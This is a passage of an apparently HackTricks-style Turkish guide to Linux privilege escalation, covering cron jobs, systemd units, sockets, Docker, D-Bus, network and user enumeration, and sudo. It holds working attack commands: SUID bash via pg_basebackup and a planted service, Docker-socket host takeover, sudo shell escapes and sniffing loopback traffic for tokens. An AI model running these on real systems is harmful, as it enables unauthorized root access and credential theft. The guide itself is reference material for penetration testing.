- `O_EXCL` ile `O_CREAT`: yol zaten varsa işlemi başarısız kılar (saldırganın önceden oluşturduğu bağlantıları/dosyaları engeller).
- `openat()`: güvenilir bir dizin dosya tanıtıcısına göre işlem yapar.
- `mkstemp()`: geçici dosyaları güvenli izinlerle atomik olarak oluşturur.

### Yazılabilir payload’lara sahip, özel imzalı cron ikilileri
Bir root cron job’ının çalıştırdığı ikili dosyanın tam olarak kendisine yazma izni olan sıradan bir kullanıcı, bir ayrıcalık sınırını aşabilir; ancak özel bir imza denetimi imzasız bir değiştirilmiş dosyayı reddedebilir. Belgelenen durumda, root’a ait ELF dosyasının modu `0760` idi; bu, grubun bir üyesinin dosyaya yazmasına, root sahibinin ise dosyayı çalıştırmasına izin veriyordu. Görünür bir süreç izlemesi, job ikili dosyayı çalıştırmadan önce `objcopy` komutunun `.text_sig` bölümünü çıkardığını gösteriyordu; doğrulayıcı betiğinin tamamı okunamıyordu.<sup>[[2]](#references)</sup>

Başarılı olan değiştirilmiş dosya, leaked özel imzalama materyali kullanılarak bir ELF signer ile imzalanmıştı. [Biçim belgeleri](https://github.com/NUAA-WatchDog/linux-elf-binary-signer), çalıştırılabilir dosyanın `.text` bölümünden türetilen bir imza bölümünü açıklar. Yalnızca `.text_sig` bölümüne bir sertifika veya eşleşen bir dize eklemenin, görülmeyen doğrulayıcıyı geçmeye yeterli olduğu gösterilmemiştir. Yazılabilir imzalı bir ikilinin istismar edilebilir olduğu sonucuna varmadan önce gerçek zamanlanmış yolu, etkin yazma erişimini, root tarafından çalıştırılma durumunu ve doğrulayıcı politikasını kontrol edin. Tek başına bir `.text_sig` bölümü, yalnızca inceleme için bir ipucudur.

### Sık çalışan cron job’ları

Her 1, 2 veya 5 dakikada bir çalıştırılan süreçleri aramak için süreçleri izleyebilirsiniz. Belki bundan yararlanıp ayrıcalıkları yükseltebilirsiniz.

Örneğin, **1 dakika boyunca her 0.1 saniyede bir izlemek**, **en az çalıştırılan komutları başa sıralamak** ve en çok çalıştırılan komutları silmek için şunu yapabilirsiniz:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Ayrıca** [**pspy**](https://github.com/DominicBreuker/pspy/releases) **kullanabilirsiniz** (bu, başlayan her işlemi izler ve listeler).

### Saldırganın ayarladığı mode bit'lerini koruyan root yedekleri (pg_basebackup)

Root tarafından sahip olunan bir cron, yazma izniniz olan bir veritabanı dizininde `pg_basebackup` (veya herhangi bir özyinelemeli kopyalama işlemi) çalıştırıyorsa, yedekleme çıktısına **root:root** sahibiyle ve aynı mode bit'leriyle yeniden kopyalanacak bir **SUID/SGID binary** yerleştirebilirsiniz.<sup>[[26]](#references)</sup>

Tipik keşif akışı (düşük ayrıcalıklı bir DB kullanıcısı olarak):
- `pspy` kullanarak, her dakika `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` gibi bir komut çalıştıran root cron'u tespit edin.
- Kaynak cluster'ın (ör. `/var/lib/postgresql/14/main`) sizin tarafınızdan yazılabilir olduğunu ve iş tamamlandıktan sonra hedefin (`/opt/backups/current`) root'a ait olduğunu doğrulayın.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Bu, `pg_basebackup` küme kopyalanırken dosya izin bitlerini koruduğu için işe yarar; root tarafından çalıştırıldığında hedef dosyalar **root sahipliğini + saldırganın seçtiği SUID/SGID izinlerini** devralır. İzinleri koruyup çalıştırılabilir bir konuma yazan benzer herhangi bir ayrıcalıklı yedekleme/kopyalama yordamı savunmasızdır.

### Görünmez cron işleri

Bir yorumdan sonra (yeni satır karakteri olmadan) **satır başı dönüşü ekleyerek** cron işi oluşturmak mümkündür ve cron işi çalışır. Örnek (satır başı dönüşü karakterine dikkat edin):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Bu tür gizli bir girişi tespit etmek için, kontrol karakterlerini görünür kılan araçlarla cron dosyalarını inceleyin:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Hizmetler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyasına yazıp yazamadığınızı kontrol edin. Yazabiliyorsanız, hizmet başlatıldığında, yeniden başlatıldığında veya durdurulduğunda backdoor’unuzu **çalıştırması** için dosyayı **değiştirebilirsiniz** (makinenin yeniden başlatılmasını beklemeniz gerekebilir).\
Örneğin, backdoor’unuzu `.service` dosyasına **`ExecStart=/tmp/script.sh`** ile ekleyin.

### Yazılabilir hizmet ikilileri

Hizmetler tarafından çalıştırılan ikililer üzerinde **yazma izniniz** varsa, bunları backdoor’larla değiştirebilirsiniz. Böylece hizmetler yeniden çalıştırıldığında backdoor’lar çalıştırılır.

### systemd PATH - Göreli Yollar

**systemd** tarafından kullanılan PATH’i şu komutla görebilirsiniz:

```bash
systemctl show-environment
```

Yol üzerindeki herhangi bir klasöre **yazabildiğinizi** fark ederseniz, **ayrıcalıkları yükseltebilirsiniz**. Şunun gibi hizmet yapılandırma dosyalarında kullanılan **göreli yolları** aramanız gerekir:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Ardından, yazabileceğiniz systemd PATH klasöründe göreli yol ikilisiyle aynı ada sahip **çalıştırılabilir** bir dosya oluşturun. Hizmetten güvenlik açığı bulunan eylemi (**Start**, **Stop**, **Reload**) gerçekleştirmesi istendiğinde **backdoor**'unuz çalıştırılır (yetkisiz kullanıcılar genellikle hizmetleri başlatamaz/durduramaz ancak `sudo -l` kullanıp kullanamayacağınızı kontrol edin).

**Hizmetler hakkında daha fazla bilgi için `man systemd.service` komutunu kullanın.**

## **Timers**

**Timers**, adı `**.timer**` ile biten ve `**.service**` dosyalarını veya olayları kontrol eden systemd unit dosyalarıdır. Yerleşik takvim zamanı olayları ve monotonik zaman olayları desteğine sahip olduklarından ve eşzamansız çalıştırılabildiklerinden **Timers**, cron'a alternatif olarak kullanılabilir.

Tüm timer'ları şu komutla listeleyebilirsiniz:

```bash
systemctl list-timers --all
```

### Yazılabilir zamanlayıcılar

Bir timer'ı değiştirebiliyorsanız, systemd.unit türlerinden bazılarını (ör. `.service` veya `.target`) çalıştırmasını sağlayabilirsiniz.

```bash
Unit=backdoor.service
```

Dokümantasyonda Unit'in ne olduğunu okuyabilirsiniz:

> Bu timer sona erdiğinde etkinleştirilecek unit. Argüman, son eki ".timer" olmayan bir unit adıdır. Belirtilmezse bu değer, son ek hariç timer unit'iyle aynı ada sahip bir service olur. (Yukarıya bakın.) Etkinleştirilen unit'in adıyla timer unit'inin adının, son ek hariç, aynı olması önerilir.

Dolayısıyla bu izni kötüye kullanmak için şunları yapmanız gerekir:

- **Yazılabilir bir binary çalıştıran** bir systemd unit (ör. `.service`) bulun
- **Göreli bir yol çalıştıran** ve **systemd PATH** üzerinde **yazma ayrıcalıklarına** sahip olduğunuz bir systemd unit bulun (bu executable'ı taklit etmek için)

**Timer'lar hakkında daha fazla bilgi için `man systemd.timer` komutuna bakın.**

### **Timer'ı Etkinleştirme**

Bir timer'ı etkinleştirmek için root ayrıcalıklarına sahip olmanız ve şu komutu çalıştırmanız gerekir:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

`/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` konumunda bir symlink oluşturularak **timer**'ın **etkinleştirildiğini** unutmayın.

## Soketler

Unix Domain Sockets (UDS), istemci-sunucu modellerinde aynı veya farklı makinelerde **process iletişimini** sağlar. Bilgisayarlar arası iletişim için standart Unix descriptor dosyalarını kullanır ve `.socket` dosyaları aracılığıyla kurulur.<sup>[[14]](#references)</sup>

Soketler `.socket` dosyaları kullanılarak yapılandırılabilir.

**Soketler hakkında `man systemd.socket` ile daha fazla bilgi edinin.** Bu dosyada birkaç ilginç parametre yapılandırılabilir:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır; ancak özetle soketin **nerede dinleme yapacağını belirtmek** için kullanılır (AF_UNIX soket dosyasının yolu, dinlenecek IPv4/6 adresi ve/veya port numarası vb.).
- `Accept`: Boolean türünde bir argüman alır. **true** ise, **her gelen bağlantı için bir service örneği başlatılır** ve ona yalnızca bağlantı soketi aktarılır. **false** ise, dinleme yapan soketlerin tümü **başlatılan service unit'e aktarılır** ve tüm bağlantılar için yalnızca bir service unit başlatılır. Tek bir service unit'in koşulsuz olarak tüm gelen trafiği işlediği datagram soketleri ve FIFO'lar için bu değer yok sayılır. Varsayılan değer **false**'tur. Performans nedenleriyle, yeni daemon'ları yalnızca `Accept=no` için uygun olacak şekilde yazmanız önerilir.
- `ExecStartPre`, `ExecStartPost`: Dinleme yapan **soketler**/FIFO'lar oluşturulup bağlanmadan **önce** veya **sonra** çalıştırılacak bir veya daha fazla komut satırı alır. Komut satırının ilk öğesi mutlak bir dosya adı olmalı, ardından process için argümanlar gelmelidir.
- `ExecStopPre`, `ExecStopPost`: Dinleme yapan **soketler**/FIFO'lar kapatılıp kaldırılmadan **önce** veya **sonra** çalıştırılacak ek **komutlar** alır.
- `Service`: Gelen **trafikte etkinleştirilecek** **service** unit'in adını belirtir. Bu ayara yalnızca Accept=no olan soketler için izin verilir. Varsayılan olarak, soketle aynı adı taşıyan service kullanılır (sonek değiştirilir). Çoğu durumda bu seçeneği kullanmak gerekmez.

### Yazılabilir .socket dosyaları

**Yazılabilir** bir `.socket` dosyası bulursanız, `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir satır **ekleyebilirsiniz**; böylece backdoor, soket oluşturulmadan önce çalıştırılır. Bu nedenle **muhtemelen makine yeniden başlatılana kadar beklemeniz gerekecektir.**\
_Ardından backdoor'un çalışması için sistemin bu soket dosyası yapılandırmasını kullanıyor olması gerektiğini unutmayın._

### Soket aktivasyonu + yazılabilir unit yolu (eksik service oluşturma)

Etki düzeyi yüksek bir diğer yanlış yapılandırma şudur:

- `Accept=no` ve `Service=<name>.service` içeren bir socket unit
- başvurulan service unit eksik
- bir saldırganın `/etc/systemd/system` (veya başka bir unit arama yolu) içine yazabilmesi

Bu durumda saldırgan `<name>.service` oluşturabilir, ardından systemd'nin yeni service'i root olarak yükleyip çalıştırması için sokete trafik gönderebilir.

Hızlı akış:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Yazılabilir soketler

**Herhangi bir yazılabilir soket tespit ederseniz** (_burada Unix Sockets'ten bahsediyoruz, config `.socket` dosyalarından değil_), bu soketle **iletişim kurabilir** ve belki bir güvenlik açığından yararlanabilirsiniz.

### Unix Soketlerini Listeleme

```bash
netstat -a -p --unix
```

### Ham bağlantı

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Exploitation örneği:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

HTTP isteklerini dinleyen bazı **socket'ler** olabilir (_.socket dosyalarından değil, unix socket olarak çalışan dosyalardan bahsediyorum_). Bunu şu şekilde kontrol edebilirsiniz:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Soket bir **HTTP isteğine yanıt veriyorsa**, onunla **iletişim kurabilir** ve belki de **bir güvenlik açığından yararlanabilirsiniz**.

### Yazılabilir Docker Socket

Genellikle `/var/run/docker.sock` konumunda bulunan Docker socket, güvenliğinin sağlanması gereken kritik bir dosyadır. Varsayılan olarak `root` kullanıcısı ve `docker` grubunun üyeleri tarafından yazılabilir. Bu socket'e yazma erişimine sahip olmak, yetki yükseltmeye yol açabilir. Aşağıda bunun nasıl yapılabileceği ve Docker CLI kullanılamıyorsa uygulanabilecek alternatif yöntemler açıklanmıştır.

#### **Docker CLI ile Yetki Yükseltme**

Docker socket'e yazma erişiminiz varsa aşağıdaki komutları kullanarak yetki yükseltebilirsiniz:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Bu komutlar, ana makinenin dosya sistemine root düzeyinde erişimi olan bir container çalıştırmanızı sağlar.

#### **Docker API'yi Doğrudan Kullanma**

Docker CLI kullanılamadığı durumlarda bile, Unix socket üzerinden ham HTTP kullanılarak Docker socket kötüye kullanılabilir. En güvenilir yöntem şöyledir:

- ana makinenin root dizini bind-mount edilmiş, uzun süre çalışan bir yardımcı container oluşturun
- container'ı başlatın
- bu yardımcı container içinde bir `exec` örneği oluşturun
- `exec` örneğini başlatın ve API üzerinden çıktıyı okuyun

**Docker image'larını listeleme**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Bir yardımcı container oluşturun ve başlatın**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Bir exec örneği oluşturun**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**exec instance'ı başlatın ve çıktıyı okuyun**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Bu yaklaşım, `attach` komutunu `socat` veya `nc -U` ile elle kullanmaya çalışmaktan genellikle daha sağlamdır. `/:/host` ile bir yardımcı oluşturabildiğinizde, `/host/root/...` gibi dosyaları okumak, `/host/root/.ssh` altına SSH anahtarları eklemek veya host başlangıç dosyalarını değiştirmek için ek `exec` örnekleri kullanabilirsiniz.

### Diğerleri

Docker soketi üzerinde yazma izniniz varsa ve **`docker` grubundaysanız**, [**ayrıcalıkları yükseltmenin daha fazla yolu vardır**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). [**Docker API bir portta dinliyorsa**, onu da ele geçirebilirsiniz](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

**Container'lardan kaçmanın veya ayrıcalıkları yükseltmek için container runtime'larını kötüye kullanmanın** daha fazla yolunu burada inceleyin:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) ayrıcalık yükseltme

**`ctr`** komutunu kullanabildiğinizi fark ederseniz, **onu kötüye kullanarak ayrıcalıkları yükseltebileceğiniz** için aşağıdaki sayfayı okuyun:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** ayrıcalık yükseltme

**`runc`** komutunu kullanabildiğinizi fark ederseniz, **onu kötüye kullanarak ayrıcalıkları yükseltebileceğiniz** için aşağıdaki sayfayı okuyun:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli biçimde etkileşim kurmasını ve veri paylaşmasını sağlayan gelişmiş bir **süreçler arası iletişim (IPC) sistemidir**. Modern Linux sistemleri göz önünde bulundurularak tasarlanan D-Bus, çeşitli uygulama iletişimi biçimleri için sağlam bir çerçeve sunar.<sup>[[16]](#references)</sup>

Sistem çok yönlüdür; süreçler arasındaki veri alışverişini geliştiren temel IPC'yi destekler ve **gelişmiş UNIX domain socket'lerini** andırır. Ayrıca olayların veya sinyallerin yayınlanmasına yardımcı olarak sistem bileşenleri arasında sorunsuz entegrasyon sağlar. Örneğin, Bluetooth daemon'ından gelen bir çağrı sinyali, müzik çaların sesi kapatmasını sağlayarak kullanıcı deneyimini iyileştirebilir. D-Bus ayrıca uzak nesne sistemini destekleyerek uygulamalar arasında hizmet isteklerini ve yöntem çağrılarını basitleştirir ve geleneksel olarak karmaşık olan süreçleri kolaylaştırır.

D-Bus, mesaj izinlerini (yöntem çağrıları, sinyal yayınları vb.) eşleşen politika kurallarının toplam etkisine göre yöneten bir **izin ver/engelle modeli** kullanır. Bu politikalar bus ile etkileşimleri belirler ve izinlerin kötüye kullanılması yoluyla ayrıcalık yükseltmeye olanak sağlayabilir.

`/etc/dbus-1/system.d/wpa_supplicant.conf` dosyasındaki böyle bir politikaya örnek olarak, root kullanıcısının `fi.w1.wpa_supplicant1` sahibi olmasına, bu hedefe mesaj göndermesine ve buradan mesaj almasına ilişkin izinler verilebilir.

Kullanıcı veya grup belirtilmeyen politikalar herkes için geçerlidir; "default" bağlam politikaları ise diğer özel politikaların kapsamadığı tüm durumlara uygulanır.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**D-Bus iletişimini nasıl enumerate edip exploit edeceğinizi burada öğrenin:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağı enumerate edip makinenin konumunu belirlemek her zaman ilgi çekicidir.

### Genel enumeration

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

If aktif bir `/etc/inetd.conf` girdisi GNU Inetutils `telnetd`'yi root olarak çalıştırıyorsa, yapılandırılmış binary sürümünü ve yerel dinleyiciyi, port yalnızca loopback'e bağlı olsa bile kontrol edin. GNU Inetutils 1.9.3 ile 2.7 arasındaki sürümlerde, istemcinin sağladığı `USER` değerinin `login -f` komutuna iletildiği bir [telnet kimlik doğrulama atlatma açığı](https://seclists.org/oss-sec/2026/q1/89) vardı (CVE-2026-24061). Bir süreç veya sürüm dizesi bir göstergedir; sistemin açığa çıktığı sonucuna varmadan önce tedarikçinin yama durumunu ve çalışan gerçek daemon'u doğrulayın. [Telnet kılavuzunda](../../../network-services-pentesting/pentesting-telnet.md) daha fazla ayrıntı bulunur.

### Giden trafik filtrelemesinde hızlı ön değerlendirme

Host komut çalıştırabiliyor ancak callback'ler başarısız oluyorsa DNS, taşıma katmanı, proxy ve rota filtrelemesini hızla birbirinden ayırın:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Açık portlar

Makineye erişmeden önce etkileşim kuramadığınız ağ hizmetlerini her zaman kontrol edin:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Dinleyicileri bind hedeflerine göre sınıflandırın:

- `0.0.0.0` / `[::]`: tüm yerel arayüzlerde dışarıya açıktır.
- `127.0.0.1` / `::1`: yalnızca yerel erişime açıktır (tunnel/forward için uygun adaylar).
- Belirli dahili IP'ler (örn. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): genellikle yalnızca dahili segmentlerden erişilebilir.

### Yalnızca yerel hizmetler için ön değerlendirme akışı

Bir host'u compromise ettiğinizde, `127.0.0.1` adresine bind edilmiş hizmetlere shell'inizden ilk kez erişilebilir hâle gelebilir. Hızlı bir yerel iş akışı şöyledir:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### Ağ tarayıcısı olarak LinPEAS (yalnızca ağ modu)

Yerel PE kontrollerinin yanı sıra linPEAS, odaklı bir ağ tarayıcısı olarak çalışabilir. `$PATH` içindeki mevcut ikili dosyaları kullanır (genellikle `fping`, `ping`, `nc`, `ncat`) ve araç yüklemez.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

`-t` olmadan `-d`, `-p` veya `-i` geçirirseniz, linPEAS saf bir ağ tarayıcısı gibi çalışır (diğer yetki yükseltme kontrollerini atlar).

### Sniffing

Trafiği sniff edip edemediğinizi kontrol edin. Edebiliyorsanız bazı kimlik bilgilerini ele geçirebilirsiniz.

```
timeout 1 tcpdump
```

Hızlı pratik kontroller:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`), post-exploitation sırasında özellikle değerlidir; çünkü yalnızca dahili hizmetler burada token/cookie/credential bilgilerini açığa çıkarabilir:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Şimdi yakala, sonra ayrıştır:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Kullanıcılar

### Genel Numaralandırma

**Kim** olduğunuzu, hangi **yetkilere** sahip olduğunuzu, sistemlerde hangi **kullanıcıların** bulunduğunu, hangilerinin **login** olabildiğini ve hangilerinin **root yetkilerine** sahip olduğunu kontrol edin:

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Büyük UID

Bazı Linux sürümleri, **UID > INT_MAX** değerine sahip kullanıcıların ayrıcalık yükseltmesine olanak tanıyan bir hatadan etkilenmiştir. Daha fazla bilgi: [burada](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [burada](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) ve [burada](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Exploit etmek** için şunu kullanın: **`systemd-run -t /bin/bash`**

### Gruplar

Root ayrıcalıkları sağlayabilecek bir grubun **üyesi olup olmadığınızı** kontrol edin:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Pano

Panoda ilginç bir şey olup olmadığını kontrol edin (mümkünse)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Parola Politikası

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Bilinen parolalar

Ortamda **herhangi bir parolayı biliyorsanız**, bu parolayı kullanarak **her kullanıcı olarak oturum açmayı deneyin**.

### Su Brute

Çok fazla gürültü çıkarmayı sorun etmiyorsanız ve bilgisayarda `su` ile `timeout` binary'leri varsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcılar üzerinde brute-force deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) de `-a` parametresiyle kullanıcılar üzerinde brute-force denemesi yapar.

## Yazılabilir PATH kötüye kullanımları

### $PATH

**$PATH içindeki bir klasöre yazabildiğinizi** fark ederseniz, **yazılabilir klasörün içine bir backdoor oluşturarak** ayrıcalıklarınızı yükseltebilirsiniz. Backdoor'a, başka bir kullanıcı (ideal olarak root) tarafından çalıştırılacak ve $PATH içinde yazılabilir klasörünüzden önce gelen bir klasörden **yüklenmeyen** bir komutun adını verebilirsiniz.

### SUDO ve SUID

`sudo` kullanarak bazı komutları çalıştırmanıza izin veriliyor olabilir veya bu komutlarda suid biti ayarlanmış olabilir. Şunu kullanarak kontrol edin:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Bazı **beklenmedik komutlar dosyaları okumanıza ve/veya yazmanıza, hatta bir komut çalıştırmanıza olanak tanır**.<sup>[[8]](#references)</sup> Örneğin:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudo yapılandırması, bir kullanıcının parolayı bilmeden başka bir kullanıcının ayrıcalıklarıyla bazı komutları çalıştırmasına izin verebilir.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

Bu örnekte demo kullanıcısı vim'i root olarak çalıştırabilir; root dizinine bir SSH key ekleyerek veya sh çağırarak shell almak artık çok kolaydır.

```
sudo vim -c '!sh'
```

### sudo scriptinde tırnak içine alınmamış Bash karşılaştırması

Bash'te `[[ "$protected" == $candidate ]]` ifadesinin sağ tarafı bir pattern'dir. Root yetkisiyle çalışabilen bir sudo script'i `candidate` değerini çağıranın kontrolündeki bir dosyadan alıyorsa, `prefix*` gibi bir değer korunan bir dizenin başlangıcıyla eşleşebilir. Farklı başarı ve hata yolları, bir prefix oracle'ı açığa çıkarabilir. Amaç literal eşitlikse sağ tarafı tırnak içine alın (`[[ "$protected" == "$candidate" ]]`). Tırnak içine alınmamış bir karşılaştırmayı istismar edilebilir kabul etmeden önce gerçek sudo argümanlarını, girdinin kaynağını ve gözlemlenebilir dallanma davranışını inceleyin. [GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html), bu pattern davranışını tanımlar.

### sudo ile PrusaSlicer proje dosyaları

